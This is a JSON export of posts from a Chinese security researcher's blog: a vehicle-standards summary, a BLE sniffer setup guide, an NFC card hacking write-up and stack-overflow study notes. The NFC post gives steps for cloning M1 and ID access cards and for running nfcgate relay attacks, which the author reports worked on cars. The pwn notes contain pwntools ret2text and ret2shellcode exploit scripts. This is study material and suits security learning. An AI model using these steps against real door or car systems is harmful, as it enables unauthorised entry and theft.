{"posts":[{"title":"智能网联汽车标准体系框架","content":" 内容来自于国家车联网产业标准体系建设指南（智能网联汽车）（2023 版） 按照智能网联汽车标准体系的技术逻辑架构，综合考虑不同功能、产品和技术类型、各子系统之间的交互关系，将智能网联汽车标准体系划分为三个层级。其中，第一层级规定了智能网联汽车标准体系的基本分类，即基础、通用规范、产品与技术应用三个部分；第二层级根据标准内容范围和技术等级，细分形成 14 个二级分类；第三层级按照技术逻辑，进一步细化形成 23 个三级分类，从而形成了逻辑清晰、内容完整、结构合理、界限分明的标准体系框架。 ","link":"https://xyzper.github.io/post/_8tgjsTGh/"},{"title":"nRF52840BLE抓包工具配置教程","content":"使用nRF52840进行BLE抓包教程 准备工作 nRF52840硬件设备 SOC芯片购买链接 抓包嗅探模组请找其他网销渠道 Wireshark安装包 下载链接 nRF Connect 下载链接 nrf_sniffer_for_bluetooth_le 软件包 下载链接 Python3 刷写嗅探抓包固件 打开nRF Connect for Desktop并启动nRF Connect Programmer。 将nRF52840软件狗插入计算机上的USB端口。 按下RESET（重置）按钮，将nRF模组置于引导加载程序模式。 在应用程序的导航栏中，单击SELECT DEVICE，然后从下拉列表中选择出现设备的序列号。 拖拽nrf_sniffer_for_bluetooth_le软件包中的HEX文件夹下的sniffer_nrf52840dongle_nrf52840_4.1.1.hex到File memory layoutzhong视图上。 点击左侧DEVICE栏中的Write等待固件刷写完毕。 写入过程完成后，设备将重置，除非应用程序使用DFU触发，否则加密狗将不再显示在Programmer应用程序中，因为它不再处于引导加载程序模式,即无法再重新用此方式刷写，所以务必选择正确的HEX文件。 刷写成功后打开设备管理器可以看到系统识别出nRF设备为COM口。 Wireshark BLE抓包配置 打开 wireshark 依次点击帮助 &gt;&gt; 关于Wireshark &gt;&gt; 文件夹 打开Global Extcap path对应的文件夹，将软件包内extcap文件夹的内容全部复制到该目录中。 在该文件夹的地址栏处输入cmd并点击回车，打开命令提示符。 输入pip install -r requirements.txt 安装所需的python软件包。 再次打开Personal Extcap path对应的文件夹，将软件包内Profile_nRF_Sniffer_Bluetooth_LE文件夹复制到该目录中。 点击wireshark右下角的配置将其选择为Profile_nRF_Sniffer_Bluetooth_LE。 重新打开Wireshark，在捕获接口中选择 nRF Sniffer for Bluetooth LE COM**，双击打开即可开始抓包。 显示如下界面即为配置完成。 ","link":"https://xyzper.github.io/post/nrf52840ble-zhua-bao-gong-ju-pei-zhi-jiao-cheng/"},{"title":"BLE安全入门分析（一）","content":"作为一个从来没有接触过蓝牙安全的小白一直对蓝牙协议栈望而生畏，然鹅这次接到的项目里面有蓝牙安全的培训需求，恰好我们这边懂蓝牙的大佬已经离职了，无奈被迫零基础学蓝牙。 现在培训以及结束了，遂把这次学习过程记录下来。 蓝牙协议栈的学习 ","link":"https://xyzper.github.io/post/ble-an-quan-ru-men-fen-xi-yi/"},{"title":"NFC技术分享","content":"大学期间就一直在零零散散的去研究NFC了，M1的那一套已经是研究的差不多了，许多厂家的门jin和Watercard都搞过，但是那些数据分析方法不好发出来，有兴趣的自己研究吧，我这里只是NFC这个技术本身的影响不涉及那些数据的。CPU卡也研究了一部分，主要是针对1208CPU卡的指令集的，等有时间了再继续整理。 NFC技术分享 RFID相关 射频技术（RF）是Radio Frequency的缩写。较常见的应用有无线射频识别（Radio Frequency Identification，RFID），常称为感应式电子晶片或近接卡、感应卡、非接触卡、电子标签、电子条码等。其原理为由扫描器发射一特定频率之无线电波能量给接收器，用以驱动接收器电路将内部的代码送出，此时扫描器便接收此代码。 接收器的特殊在于免用电池、免接触、免刷卡故不怕脏污，且晶片密码为世界唯一无法复制，安全性高、长寿命。RFID的应用非常广泛，典型应用有动物晶片、汽车晶片防盗器、门禁管制、停车场管制、生产线自动化、物料管理。 标签(Tag) 由耦合元件及芯片组成，每个标签具有唯一的电子编码，附着在物体上标识目标对象 阅读器(Reader) 读取(有时还可以写入)标签信息的设备，可设计为手持式或固定式 天线(Antenna) 在标签和读取器间传递射频信号。 RFID标签有两种：有源标签和无源标签。其中高频有源标签UHF被广泛应用于交通运输行业，高速收费路口使用的ETC就是一种UHF。 设备补充内容 卡片分类 分类方式有很多，IC卡ID卡 接触式IC卡 非接触式IC卡 双界面卡 S50卡 T5577卡....... 比如接触式IC卡（当前使用广泛的是接触型IC卡，其表面可以看到一个方型镀金接口，共有八个或六个镀金触点，用于与读写器接触，通过电流信号完成读写。读写操作（称为刷卡）时须将IC卡插入读写器，读写完毕，卡片自动弹出，或人为抽出。接触式IC卡刷卡相对慢，但可靠性高，多用于存储信息量大，读写操作复杂的场合。） 非接触型IC卡 具有接触式IC卡同样的芯片技术和特性，最大的区别在于卡上设有射频信号或红外线收发器，在一定距离内即可收发读写器的信号，因而和读写设备之间无机械接触。 在前述IC卡的电路基础上带有射频收发及相关电路的非接触IC卡被称作“射频卡”或“RF卡”。 这种IC卡常用于身份验证，电子门禁等场合。卡上记录信息简单，读写要求不高，卡型变化也较大，可以作成徽章等形式。 低频卡 125KHz和134KHz ID卡 只读卡 序列串 HID卡 ID复制卡： T5577卡/5200卡 8678卡 125k/175k/250k/300k/375k/500k F8268卡 125k/250k 高频卡 -14443A 13.56MHz， 主要是Philips的Mifare系列 M1 S50卡 普通IC卡，0扇区不可以修改，其他扇区可反复擦写，我们使用的电梯卡、门禁卡等智能卡发卡商所使用的都是 M1 卡，可以理解为物业发的原卡。 UID卡 （国外称GEN1） 可以修改任意扇区，作为M1复制的子卡，主要应用在IC卡复制上。该卡片完全兼容mifare 1k卡片。卡片的block0（UID所在的block）可以任意修改，重复修改。 CUID卡(国外称GEN2) 可擦写防屏蔽卡，可以重复擦写所有扇区，UID卡复制无效的情况下使用，可以绕过防火墙。 FUID卡 不可擦写防屏蔽卡，此卡的特点0扇区只能写入一次，写入一次变成 M1 卡，CUID 复制没用的情况下使用，可以绕过防火墙。 CFUID卡 高级复制卡，我们就理解为是 UID 和 FUID 的合成卡，需要封卡操作，不封卡就是 UID 卡，封卡后就变为 M1 卡。 KUID卡 GTU/GUID/GDMIC卡 如何区分ID卡和IC卡？ 高频卡 -14443B CPU卡内有COS（可以简单认为是一个微型的系统），典型的卡COS都是固化进ROM的，而还有部分可以修改COS的CPU卡，这种卡COS是写在EEPROM里的，可以多次修改，简直就是神卡啊。不过由于具有COS，加密协议可以自己定义，安全性是十分高的，破解的难度也是非常大的。 二代身份证，社保卡，护照 SRI512卡 SRIX4K卡 M1卡数据分析 M1卡数据格式 M1卡有从0到15共16个扇区，每个扇区配备了从0到3共4个段，每个段可以保存16字节的内容，为什么这里要强调从0开始呢？这跟C语言里面数组下标默认从0开始是差不多的，好计算地址偏移，我们不必太过在意，只是要记住是从0开始，写入数据的时候不要写错地方就可以了。每个扇区的第4个段（也就是3段）是用来保存KeyA，KeyB和控制位的，因为M1卡允许每个扇区有一对独立的密码保护，这样能够更加灵活的控制数据的操作，控制位就是这个扇区各种详细权限计算出来的结果。 每张M1卡都有一个全球唯一的UID号，这个UID号保存在卡的第一个扇区（0扇区）的第一段（0段），也称为厂商段，其中前4个字节是卡的UID，第5个字节是卡UID的校验位，剩下的是厂商数据。并且这个段在出厂之前就会被设置了写入保护，只能读取不能修改，当然也有例外，有种叫UID卡的特殊卡，UID是没有设置保护的，其实就是厂家不按规范生产的卡，M1卡出厂是要求要锁死UID的。下图很清晰的列出了M1卡的结构。 区块 区块类型 数据内容 块号 【扇区0】块0 数据块 0C B3 63 61 BD 08 04 00 02 73 39 F2 22 87 0B 1D UID卡号0C B3 63 61 0 块1 数据块 A6 AD BF AB A9 B8 AD AB D9 D0 D9 D8 DB D9 10 35 存储数据 1 块2 数据块 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 存储数据 2 块3 控制块 BC FE B8 35 31 85 7F 07 88 99 C7 17 0D 44 62 AD 控制位7F 07 88 99 3 【扇区1】块0 数据块 4 块1 数据块 5 ... ... ..... ..... .... 块3 控制块 59 块0 数据块 00 00 15 F4 00 00 00 00 00 00 00 00 05 0D 43 95 余额‭56.20‬ 60 块1 数据块 00 00 15 F4 00 00 00 00 00 00 00 00 05 0D 43 95 61 块2 数据块 00 00 00 00 00 00 00 00 00 00 00 00 00 00 AA 2E 62 块3 控制块 密钥+控制位+密钥 63 控制位详解 ​ 这个是每个扇区 最后一块的存储控制结构，一共4个字节，例如：（7F 07 88 99） 。这里记住一个特殊的数据 FF 07 80 69 BC FE B8 35 31 85 7F 07 88 99 C7 17 0D 44 62 AD 密钥A 控制位 密钥B 其中7F 07 88 99是四个16进制位， 这些数字是16进制的数字，然后一个1byte（字节）=8bits，所以他们的结构如下： 控制位\\bit 7 6 5 4 3 2 1 0 7F C23_b C22_b C21_b C20_ C13_b C12_b C11_b C10_b 07 C13 C12 C11 C10 C33_b C32_b C31_b C30_b 88 C33 C32 C31 C30 C23 C22 C21 C20 99 预留 控制位\\bit 7 6 5 4 3 2 1 0 7F C23_b C22_b C21_b C20_b C13_b C12_b C11_b C10_b 0111 1111 0 1 1 1 1 1 1 1 07 C13 C12 C11 C10 C33_b C32_b C31_b C30_b 0000 0111 0 0 0 0 1 1 1 1 88 C33 C32 C31 C30 C23 C22 C21 C20 1000 1000 1 0 0 0 1 0 0 0 99 预留 三个控制位以正和反两种形式存在于存取控制字节中，决定了该块的访问权限（如： 进行减值操作必须验证KEY A，进行加值操作必须验证KEY B，等等）。因为控制字是由部分控制位取反的来的，由上表C33_b就可知道，所以我们要再取反一次获取原来的控制位，就能得出下面的控制位（_b为取反，比如：C33为1取反后为C33_b为0） 7F0788 99 1000 0000 0000 1000 1000 1000 在存取控制中每个块都有相应的三个控制位,定义如下： 块0： C10 C20 C30 0 0 0 权限为： 通过A或者B密码认证后可读，可写，可进行加值和减值操作。 块1： C11 C21 C31 0 0 0 权限为： 通过A或者B密码认证后可读，可写，可进行加值和减值操作。 块2： C12 C22 C32 对应上表数据可得—— 0 0 0 权限为： 通过A或者B密码认证后可读，可写，可进行加值和减值操作。 块3： C13 C23 C33 0 1 1 权限为： 通过B密码认证后可读，可写。 FF 07 80 69 默认出厂控制位 提高密钥的保密性 通过更改控制位来使得必须获取AB密钥的全部内容才可以读写数据，或者更加严格的规则。 一卡一密 难度太高，内容待定 NFC破解工具 Proxmark3 Easy 国内翻版的pm3设备，可以使用国产固件也可以使用官方的offical或者RRG固件，也可以使用冰人固件，快速响应中国后门，价格便宜，性能强，但较官方版本相比嗅探能力略有不足。 Proxmark3 rdv4 rdv4是目前官方发布的最新版本，与国产的Proxmark3 X 版本功能基本类似，带有蓝牙无线连接、在线嗅探、离线嗅探等多种功能。 缺点：价格较贵 chameleon E版/G版 E版本的模拟功能较弱，会被绝大部分的防火墙检测到，所以E版本的变色龙模拟出来的NFC卡大概率无法识别，不如UID卡复制来的快。 G版本的模拟功能较强，一个变色龙设备可以模拟8张M1卡，按键切换。 两个版本均支持嗅探，可以嗅探出一个或多个密钥。 PN532 一个最基础款的NFC读写模块，通过ch340串口工具可以接入到笔记本上，直接实现对存在PRNG weak的卡片爆破密钥，不过效率较慢。但是PN532存在空闲针脚，曾有想法通过其他空闲针脚来实现模拟一张M1卡，或可以成为NFC中继攻击的一种解决方案（只适用于M1卡，CPU卡无法使用）。 ACR122 ACR122是研究CPU卡的必备工具，但是购买的时候小心部分商家拿内置的532当122出来卖。 除此之外还有很多其他型号的NFC读写工具，其中还有很多具有特殊功能的设备。如、SONY_RCS360 、SCM_SCL3712等。 NFC卡片类型判断 这里展示都是常见的NFC卡类型，像一些特殊的卡片类型没有做展示。 通过proxmark3判断NFC卡片类型 （高频卡 ） 命令：hf 14a info 该卡为CPU卡，使用的加密芯片和加密算法要视情况而且，目前（2022.06）只有部分门禁系统的CPU卡可以破解并复制，特殊用途的卡片均不可复制，如银行卡、汽车卡片钥匙、身份证等。其中CPU卡分为CPU模拟卡和纯CPU卡 该卡为UID卡 存在Magic后门可以直接使用魔法指令写入或读取数据而无需密钥，一般作为复制卡使用。 该卡为普通M1卡，虽然不存在后门但是Prng weak 可以通过特殊手段直接破解密钥。 破解实现 M1卡破解复制 主要芯片：Mifare UtraLight IC U1、Mifare DESFire 4K；Legic MIM256 ；ST SR176、SRIX4K；I·CODE 1、 I·CODE 2；Tag-it HF-I、Tag-it TH-CB1A；Temic e5551；Atmel T5557、Atmel T5567、Atmel AT88RF256-12 ；Hitag1、 Hitag 2；μEM EM4100、EM 4102、 EM4069、EM4150；TK4100；Inside 2K、Inside 16K 卡片的安全性测试，我个人的总体流程就是如下： 首先，判断卡的类型，是IC还是ID。 如果是ID卡，那么 读卡片ID→换白卡→写入ID卡号→克隆完成→攻击成功 ID卡是低频卡，思路比较简单，IC卡为高频卡，攻击的思路可不少。 IC卡的总体思路如下： 漏洞测试→获取全卡数据→换上UID卡→写入数据→攻击成功 如果执行数据修改，思路如下： 漏洞测试→读全卡数据→解密卡片数据→破解厂商算法→修改数据→攻击成功。 （1）暴力破解 暴力破解是破解工作永远的话题，只要你拥有庞大的计算资源，管你什么密码都能破解。而且，在CRYPTO1算法的细节没有被泄露之前，最有效的方法就是暴破了。还有一个很重要的原因就是，M1卡是被动卡，需要读卡器为它提供能量，一旦读卡器切断了电源，卡中的临时数据就会丢失，这样就没有办法记录下攻击者究竟输错了多少次密码，卡永远不会因为密码输入错误太多而被锁定，只要攻击者有时间慢慢跟它耗，密码肯定会出来的。 （2）重放攻击 重放攻击是基于M1卡的PRNG算法漏洞实现的，当卡接近读卡器获得能量的时候，就会开始生成随机数序列，但这有一个问题，因为卡是被动式卡，本身自己不带电源，所以断电后数据没办法保存，这时基于LSRF的PRNG算法缺陷就出来了，每次断电后再重新接入电，卡就会生成一摸一样的随机数序列，所以我们就有可能把这个序列计算出来，所以只有我们控制好时间，就能够知道在获得能量后的某一刻时间的随机数是多少，然后进行重放攻击，就有可能篡改正常的数据。如果卡的所有权在我们手上的时候，我们甚至不需要浪费太多的时间就可以实现。 （3）克隆卡片 这是一个很简单也很实用的方法，因为M1卡自带扇区可以保存数据，所以大部分的卡片会选择加密扇区后将数据保存在里面，所以我们完全可以克隆一张带有一样数据的克隆卡。这就会用到一种叫uid卡的特殊M1模拟卡，前面说到每张M1卡在0扇区第1段都会有一个全球唯一的UID编号，而且这个块在出厂之后是被厂商设定保护无法修改的，uid卡就是没有设定0扇区保护的卡，所以你可以随意的修改你想要的uid，这样我们就可以克隆出一张连uid都相同的卡片了。 （4）密钥流窃听 利用神器proxmark 3可以嗅探到全部扇区都加密的M1卡，在卡和已经授权的读卡器交换数据的时候进行窃听，就能把tag数据读取出来，利用XOR算key工具就可以把扇区的密钥计算出来，这也是PRNG算法的漏洞所导致的。 （5）验证漏洞 验证漏洞是目前使用最多的M1破解手段，在读卡器尝试去读取一个扇区时，卡会首先发一个随机数给读卡器，读卡器接到随机数之后利用自身的算法加密这个随机数再反馈回给卡，卡再用自己的算法计算一次，发现结果一致的话就认为读卡器是授权了的，然后就用开始自己的算法加密会话并跟读卡器进行传送数据。这时候问题就来了，当我们再次尝试去访问另一个扇区，卡片又会重复刚才那几个步骤，但此时卡跟读卡器之间的数据交换已经是被算法加密了的，而这个算法又是由扇区的密钥决定的，所以密钥就被泄露出来了。因此验证漏洞要求我们至少知道一个扇区的密钥，但目前大部分的扇区都没有全部加密，所以很容易就会被破解。 嗅探获取密钥 手头没有卡做演示，暂搁置。有机会回来补上 NFC中继攻击 GitHub - nfcgate/nfcgate: An NFC research toolkit application for Android 1、需要准备： Google pixel4 *2 (至少有一台Root) Release nfcgate.APK 直达链接 2、搭建nfcgate Server直达链接 server运行 一键执行即可python server.py 3、两台手机均连接到运行的server 在设置中填写Hostname，Port默认5566，Session只要两个手机一致即可。 连接正常提示 Network: Connected, wait for partner 两台设备都填写成功上线的话RelayMode会出现绿色提示。 4、使用Relay Mode 模拟卡的那个手机必须要Root，也就是点TAG显示wait for reader的那个。 然后拿着两个手机一个刷卡 一个刷车就好了。 CPU卡片破解 这里做个提示需要去学习1208cpu卡，具体资料不合规，来源请自行寻找。 NFC中继攻击曾在好多个车型中复现成功，之前一直是不知道怎么修复，认为是技术实现的缺陷（NFC的工作机制导致其可被中继攻击），后来发现只要跟开发商提安全需求是可以修复的，具体的原理没深究过。现在也陆续发现部分车型已经不能复现成功了。 参考链接 官方GitHub RfidResearchGroup/RFIDtools RfidResearchGroup/proxmark3 RfidResearchGroup/ChameleonMini RfidResearchGroup/homebrew-proxmark3 RfidResearchGroup/ChameleonBLEAPI ","link":"https://xyzper.github.io/post/nfc-ji-zhu-fen-xiang/"},{"title":"栈溢出","content":"从来没有学习过有关pwn的内容，大学期间的学习内容也主要是以逆向为主，现在从事于安全研究工作，觉得自己应该取花时间对pwn的相关内容做一个系统的学习。我学习的内容不一定高深但一定详细，自己遇到的问题都会详细的记录 ，捋顺思路，希望可以给其他人的学习带来一丝帮助。 先需知识点 栈介绍 √ 参考资料： C语言函数调用栈(一) C语言函数调用栈(二) calling_conventions.pdf 深入理解计算机系统.pdf 这两本书是我自己看过的，但是并不一定完全适用与新手直接去学习，但是如果可以坚持看完，那么对于整个底层运作原理的理解一定会大幅提高。 寄存器 函数栈布局原理展示 1 //StackFrame.c 2 #include &lt;stdio.h&gt; 3 #include &lt;string.h&gt; 4 5 struct Strt{ 6 int member1; 7 int member2; 8 int member3; 9 }; 10 11 #define PRINT_ADDR(x) printf(&quot;&amp;&quot;#x&quot; = %p\\n&quot;, &amp;x) 12 int StackFrameContent(int para1, int para2, int para3){ 13 int locVar1 = 1; 14 int locVar2 = 2; 15 int locVar3 = 3; 16 int arr[] = {0x11,0x22,0x33}; 17 struct Strt tStrt = {0}; 18 PRINT_ADDR(para1); //若para1为char或short型，则打印para1所对应的栈上整型临时变量地址！ 19 PRINT_ADDR(para2); 20 PRINT_ADDR(para3); 21 PRINT_ADDR(locVar1); 22 PRINT_ADDR(locVar2); 23 PRINT_ADDR(locVar3); 24 PRINT_ADDR(arr); 25 PRINT_ADDR(arr[0]); 26 PRINT_ADDR(arr[1]); 27 PRINT_ADDR(arr[2]); 28 PRINT_ADDR(tStrt); 29 PRINT_ADDR(tStrt.member1); 30 PRINT_ADDR(tStrt.member2); 31 PRINT_ADDR(tStrt.member3); 32 return 0; 33 } 34 35 int main(void){ 36 int locMain1 = 1, locMain2 = 2, locMain3 = 3; 37 PRINT_ADDR(locMain1); 38 PRINT_ADDR(locMain2); 39 PRINT_ADDR(locMain3); 40 StackFrameContent(locMain1, locMain2, locMain3); 41 printf(&quot;[locMain1,2,3] = [%d, %d, %d]\\n&quot;, locMain1, locMain2, locMain3); 42 memset(&amp;locMain2, 0, 2*sizeof(int)); 43 printf(&quot;[locMain1,2,3] = [%d, %d, %d]\\n&quot;, locMain1, locMain2, locMain3); 44 return 0; 45 } StackFrame 该程序的执行结果如下所示 需要仔细注意 形参、实参、数组/结构体型的局部变量的存储结构，memset 覆盖的地址 堆栈操作 函数调用时的具体步骤如下： 主调函数将被调函数所要求的参数，根据相应的函数调用约定，保存在运行时栈中。该操作会改变程序的栈指针。 注：x86平台将参数压入调用栈中。而x86_64平台具有16个通用64位寄存器，故调用函数时前6个参数通常由寄存器传递，其余参数才通过栈传递。 主调函数将控制权移交给被调函数(使用call指令)。函数的返回地址(待执行的下条指令地址)保存在程序栈中(压栈操作隐含在call指令中)。 若有必要，被调函数会设置帧基指针，并保存被调函数希望保持不变的寄存器值。 被调函数通过修改栈顶指针的值，为自己的局部变量在运行时栈中分配内存空间，并从帧基指针的位置处向低地址方向存放被调函数的局部变量和临时变量。 被调函数执行自己任务，此时可能需要访问由主调函数传入的参数。若被调函数返回一个值，该值通常保存在一个指定寄存器中(如EAX)。 一旦被调函数完成操作，为该函数局部变量分配的栈空间将被释放。这通常是步骤4的逆向执行。 恢复步骤3中保存的寄存器值，包含主调函数的帧基指针寄存器。 被调函数将控制权交还主调函数(使用ret指令)。根据使用的函数调用约定，该操作也可能从程序栈上清除先前传入的参数。 主调函数再次获得控制权后，可能需要将先前的参数从栈上清除。在这种情况下，对栈的修改需要将帧基指针值恢复到步骤1之前的值。 步骤3与步骤4在函数调用之初常一同出现，统称为函数序(prologue)；步骤6到步骤8在函数调用的最后常一同出现，统称为函数跋(epilogue)。函数序和函数跋是编译器自动添加的开始和结束汇编代码，其实现与CPU架构和编译器相关。除步骤5代表函数实体外，其它所有操作组成函数调用。 指令序列 含义 函数序(prologue) push %ebp 将主调函数的帧基指针%ebp压栈，即保存旧栈帧中的帧基指针以便函数返回时恢复旧栈帧 mov %esp, %ebp 将主调函数的栈顶指针%esp赋给被调函数帧基指针%ebp。此时，%ebp指向被调函数新栈帧的起始地址(栈底)，亦即旧%ebp入栈后的栈顶 sub , %esp 将栈顶指针%esp减去指定字节数(栈顶下移)，即为被调函数局部变量开辟栈空间。为立即数且通常为16的整数倍(可能大于局部变量字节总数而稍显浪费，但gcc采用该规则保证数据的严格对齐以有效运用各种优化编译技术) push 可选。如有必要，被调函数负责保存某些寄存器(%edi/%esi/%ebx)值 函数跋(epilogue) pop 可选。如有必要，被调函数负责恢复某些寄存器(%edi/%esi/%ebx)值 mov %ebp, %esp* 恢复主调函数的栈顶指针%esp，将其指向被调函数栈底。此时，局部变量占用的栈空间被释放，但变量内容未被清除(跳过该处理) pop %ebp* 主调函数的帧基指针%ebp出栈，即恢复主调函数栈底。此时，栈顶指针%esp指向主调函数栈顶(espßesp-4)，亦即返回地址存放处 ret 从栈顶弹出主调函数压在栈中的返回地址到指令指针寄存器%eip中，跳回主调函数该位置处继续执行。再由主调函数恢复到调用前的栈 *：这两条指令序列也可由leave指令实现，具体用哪种方式由编译器决定。 函数的调用约定 cdecl stdcall fastcall 主调函数职责 sub $0xc,%espmovl $0x33,0x8(%esp)movl $0x22,0x4(%esp)movl $0x11,(%esp)call 8048354 sub $0xc,%espmovl $0x33,0x8(%esp)movl $0x22,0x4(%esp)movl $0x11,(%esp)call 8048354 sub $0xc,%esp sub $0x4,%espmovl $0x33,(%esp)mov $0x22,%edxmov $0x11,%ecxcall 8048354 sub $0x4,%esp 被调函数职责 push %ebpmov %esp,%ebpmov 0xc(%ebp),%eaxadd 0x8(%ebp),%eaxadd 0x10(%ebp),%eaxpop %ebpret push %ebpmov %esp,%ebpmov 0xc(%ebp),%eaxadd 0x8(%ebp),%eaxadd 0x10(%ebp),%eaxpop %ebpret $0xc //执行ret指令并清理参数占用的堆栈(栈顶指针上移参数个数*4=12个字节，以释放压栈的参数) push %ebpmov %esp,%ebpsub $0x8,%espmov %ecx,0xfffffffc(%ebp)mov %edx,0xfffffff8(%ebp)mov 0xfffffff8(%ebp),%eaxadd 0xfffffffc(%ebp),%eaxadd 0x8(%ebp),%eaxleaveret $0x4//ret &lt;压栈参数字节数&gt;。若参数不超过两个，则ret指令不带立即数，因为无参数被压栈 x86函数参数传递方法 整形 指针 浮点型 结构体 联合体 理解原理即可 x86函数返回值的传递方法 函数返回值可通过寄存器传递。当被调用函数需要返回结果给调用函数时**：** 若返回值不超过4字节(如int、short、char、指针等类型)，通常将其保存在EAX寄存器中，调用方通过读取EAX获取返回值。 若返回值大于4字节而小于8字节(如long long或_int64类型)，则通过EAX+EDX寄存器联合返回，其中EDX保存返回值高4字节，EAX保存返回值低4字节。 若返回值为浮点类型(如float和double)，则通过专用的协处理器浮点数寄存器栈的栈顶返回。 若返回值为结构体或联合体，则主调函数向被调函数传递一个额外参数，该参数指向将要保存返回值的地址。即函数调用foo(p1, p2)被转化为foo(&amp;p0, p1, p2)，以引用型参数形式传回返回值。具体步骤可能为：a.主调函数将显式的实参逆序入栈；b.将接收返回值的结构体变量地址作为隐藏参数入栈(若未定义该接收变量，则在栈上额外开辟空间作为接收返回值的临时变量)；c. 被调函数将待返回数据拷贝到隐藏参数所指向的内存地址，并将该地址存入%eax寄存器。因此，在被调函数中完成返回值的赋值工作。 注意，函数如何传递结构体或联合体返回值依赖于具体实现。不同编译器、平台、调用约定甚至编译参数下可能采用不同的实现方法。如VC6编译器对于不超过8字节的小结构体，会通过EAX+EDX寄存器返回。而对于超过8字节的大结构体，主调函数在栈上分配用于接收返回值的临时结构体，并将地址通过栈传递给被调函数；被调函数根据返回值地址设置返回值(拷贝操作)；调用返回后主调函数根据需要，再将返回值赋值给需要的临时变量(二次拷贝)。实际使用中为提高效率，通常将结构体指针作为实参传递给被调函数以接收返回值。 不要返回指向栈内存的指针，如返回被调函数内局部变量地址(包括局部数组名)。因为函数返回后，其栈帧空间被“释放”，原栈帧内分配的局部变量空间的内容是不稳定和不被保证的。 函数返回值通过寄存器传递，无需空间分配等操作，故返回值的代价很低。基于此原因，C89规范中约定，不写明返回值类型的函数，返回值类型默认为int。但这会带来类型安全隐患，如函数定义时返回值为浮点数，而函数未声明或声明时未指明返回值类型，则调用时默认从寄存器EAX(而不是浮点数寄存器)中获取返回值，导致错误！因此在C++中，不写明返回值类型的函数返回值类型为void，表示不返回值。 * ELF文件 名称 类型 属性 含义 .comment SHT_PROGBITS 包含版本控制信息。 .debug SHT_PROGBITS 此节区包含用于符号调试的信息。 .dynamic SHT_DYNAMIC SHF_ALLOC SHF_WRITE 此节区包含动态链接信息。SHF_WRITE 位设置与否是否被设置取决于具体的处理器。 .dynstr SHT_STRTAB SHF_ALLOC 此节区包含用于动态链接的字符串，大多数 情况下这些字符串代表了与符号表项相关的名称。 .dynsym SHT_DYNSYM SHF_ALLOC 此节区包含动态链接符号表。 .got SHT_PROGBITS 此节区包含全局偏移表。 .line SHT_PROGBITS 此节区包含符号调试的行号信息，描述了源程序与机器指令之间的对应关系，其内容是未定义的。 .plt SHT_PROGBITS 此节区包含过程链接表（procedure linkage table）。 .relname SHT_REL 这些节区中包含重定位信息。如果文件中包含可加载的段，段中有重定位内容，节区的属性将包含 SHF_ALLOC 位，否则该位置 0。传统上 name 根据重定位所适用的节区给定。例如 .text 节区的重定位节区名字将是：.rel.text 或者 .rela.text。 .relaname SHT_RELA .shstrtab SHT_STRTAB 此节区包含节区名称。 栈溢出 Stack Overflow √ 栈保护机制 NX：-z execstack / -z noexecstack (关闭 / 开启) Canary：-fno-stack-protector /-fstack-protector / -fstack-protector-all (关闭 / 开启 / 全开启) PIE：-no-pie / -pie (关闭 / 开启) RELRO：-z norelro / -z lazy / -z now (关闭 / 部分开启 / 完全开启) ret2text 1.找到system(/bin/bash)的地址 设为 targetaddr 2.计算gets(s) 中s对于返回地址的偏移量= 相对于ebp的偏移量 +4 3.下gets函数地址的断点，查看寄存器 esp ebp 计算偏移= ebp - esp - 1Ch (s的偏移) ##!/usr/bin/env python from pwn import * sh = process('./ret2text') target = 0x804863a sh.sendline('A' * (0x6c+4) + p32(target)) sh.interactive() ret2shellcode #main int __cdecl main(int argc, const char **argv, const char **envp) { char s[100]; // [esp+1Ch] [ebp-64h] BYREF setvbuf(stdout, 0, 2, 0); setvbuf(stdin, 0, 1, 0); puts(&quot;No system for you this time !!!&quot;); gets(s); strncpy(buf2, s, 0x64u); printf(&quot;bye bye ~&quot;); return 0; } mian函数中，gets(s) 的内容strcpy了一份在buf2 .bss:0804A080 public buf2 .bss:0804A080 ; char buf2[100] .bss:0804A080 ?? ?? ?? ?? ?? ?? ?? ?? ?? ??+buf2 db 64h dup(?) ; DATA XREF: main+7B↑o .bss:0804A080 ?? ?? ?? ?? ?? ?? ?? ?? ?? ??+_bss ends .bss:0804A080 ?? ?? ?? ?? ?? ?? ?? ?? ?? ??+ buf2 在.bss段 地址为 0x804a080 Start End Perm Name 0x08048000 0x08049000 r-xp /home/xyzper/pwn/study/ret2shellcode 0x08049000 0x0804a000 r--p /home/xyzper/pwn/study/ret2shellcode 0x0804a000 0x0804b000 rw-p /home/xyzper/pwn/study/ret2shellcode 0xf7c00000 0xf7c22000 r--p /usr/lib/i386-linux-gnu/libc.so.6 0xf7c22000 0xf7d9b000 r-xp /usr/lib/i386-linux-gnu/libc.so.6 0xf7d9b000 0xf7e1b000 r--p /usr/lib/i386-linux-gnu/libc.so.6 0xf7e1b000 0xf7e1d000 r--p /usr/lib/i386-linux-gnu/libc.so.6 0xf7e1d000 0xf7e1e000 rw-p /usr/lib/i386-linux-gnu/libc.so.6 0xf7e1e000 0xf7e28000 rw-p mapped 0xf7fc1000 0xf7fc3000 rw-p mapped 0xf7fc3000 0xf7fc7000 r--p [vvar] 0xf7fc7000 0xf7fc9000 r-xp [vdso] 0xf7fc9000 0xf7fca000 r--p /usr/lib/i386-linux-gnu/ld-linux.so.2 0xf7fca000 0xf7fed000 r-xp /usr/lib/i386-linux-gnu/ld-linux.so.2 0xf7fed000 0xf7ffb000 r--p /usr/lib/i386-linux-gnu/ld-linux.so.2 0xf7ffb000 0xf7ffd000 r--p /usr/lib/i386-linux-gnu/ld-linux.so.2 0xf7ffd000 0xf7ffe000 rw-p /usr/lib/i386-linux-gnu/ld-linux.so.2 0xfffdd000 0xffffe000 rwxp [stack] gdb 下断点在main 然后 用vmmap查看段 其中 0x804a080 &gt;&gt;&gt;&gt; 0x0804a000 0x0804b000 rw-p /home/xyzper/pwn/study/ret2shellcode 具有可执行权限 读入 shellcode，然后控制程序执行 bss 段处的 shellcode。其中，相应的偏移计算类似于 ret2text 中的例子。 #!/usr/bin/env python from pwn import * sh = process('./ret2shellcode') shellcode = asm(shellcraft.sh()) buf2_addr = 0x804a080 sh.sendline(shellcode.ljust(112, 'A') + p32(buf2_addr)) sh.interactive() ret2syscall 拓展：系统调用 Linux 在x86上的系统调用通过 int 80h 实现，用系统调用号来区分入口函数。操作系统实现系统调用的基本过程是： 应用程序调用库函数（API）； API 将系统调用号存入 EAX，然后通过中断调用使系统进入内核态； 内核中的中断处理函数根据系统调用号，调用对应的内核函数（系统调用）； 系统调用完成相应功能，将返回值存入 EAX，返回到中断处理函数； 中断处理函数返回到 API 中； API 将 EAX 